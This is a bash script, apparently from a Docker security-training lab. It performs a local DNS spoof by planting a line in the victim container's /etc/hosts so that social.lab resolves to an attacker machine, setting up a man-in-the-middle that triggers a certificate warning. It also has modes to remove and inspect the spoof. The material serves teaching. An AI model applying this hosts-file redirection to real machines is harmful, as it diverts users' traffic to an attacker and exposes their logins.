#!/bin/bash
# Local DNS spoof - run from the project root ON THE HOST (not inside a
# container). It poisons ALICE'S /etc/hosts so that, on her machine only,
# social.lab resolves to the attacker instead of the real server.
#
#   ./attacker/spoof.sh on     add    "172.28.0.66 social.lab" to alice's hosts
#   ./attacker/spoof.sh off    remove that line again
#   ./attacker/spoof.sh show   print the spoof line and what alice resolves
#
# This is the MITM step, done the way a local attacker would: Alice's resolver
# checks /etc/hosts before DNS (nsswitch "hosts: files dns"), so the planted
# line overrides whatever the lab DNS says. After "on", her Firefox looks up
# social.lab, is sent to the attacker, and its self-signed certificate triggers
# the browser's warning.
#
# (It edits alice's /etc/hosts, not the DNS server, so only Alice is affected
#  and the lab DNS is left untouched. Docker rebuilds /etc/hosts when the alice
#  container restarts, which also clears the spoof.)
#
# Docker bind-mounts /etc/hosts, so it can't be renamed over (no "sed -i"): we
# rewrite it in place with a temp file and "cat > /etc/hosts" instead.
set -e
cd "$(dirname "$0")/.."

VICTIM="alice"                 # the container whose /etc/hosts we edit
ATTACKER_IP="172.28.0.66"
DOMAIN="social.lab"
MARK="# ATTACKER-SPOOF"
TMP="/tmp/hosts.spoof"

case "$1" in
  on)
    docker compose exec "$VICTIM" sh -c \
      "grep -v '${MARK}' /etc/hosts > ${TMP} || true; \
       printf '%s\t%s\t%s\n' '${ATTACKER_IP}' '${DOMAIN}' '${MARK}' >> ${TMP}; \
       cat ${TMP} > /etc/hosts; rm -f ${TMP}"
    echo "SPOOFED: on alice, ${DOMAIN} now points at the attacker (${ATTACKER_IP})."
    echo "In Alice's Firefox, open https://${DOMAIN} - expect a certificate warning."
    echo "(Firefox caches DNS ~1 min; restart it or wait if the old site sticks.)"
    ;;
  off)
    docker compose exec "$VICTIM" sh -c \
      "grep -v '${MARK}' /etc/hosts > ${TMP} || true; \
       cat ${TMP} > /etc/hosts; rm -f ${TMP}"
    echo "RESTORED: removed the spoof line - ${DOMAIN} resolves via the lab DNS again."
    ;;
  show)
    echo "-- alice's /etc/hosts spoof line --"
    docker compose exec "$VICTIM" sh -c "grep '${MARK}' /etc/hosts || echo '(none)'"
    echo "-- what alice resolves ${DOMAIN} to now --"
    docker compose exec "$VICTIM" getent hosts "${DOMAIN}" || echo "(does not resolve)"
    ;;
  *)
    echo "usage: $0 {on|off|show}"
    exit 1
    ;;
esac
